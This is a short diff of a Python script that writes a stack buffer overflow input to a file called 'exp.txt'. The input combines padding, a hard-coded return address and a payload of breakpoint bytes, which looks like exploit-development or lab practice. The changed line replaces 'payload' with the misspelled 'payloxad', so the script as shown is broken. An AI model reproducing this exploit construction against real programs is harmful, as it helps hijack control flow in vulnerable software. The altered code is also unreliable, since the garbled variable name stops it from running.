@@ -5,7 +5,7 @@ for i in range(0x41,0x55):
 ret="\xf9\x84\x04\x08"
 ret+="\x64\xfc\xff\xbf"
 payload="\xcc"*8
-padding=buffer+ret+payload
+padding=buffer+ret+payloxad
 f=open('exp.txt','w')
 f.write(padding)
 f.close()
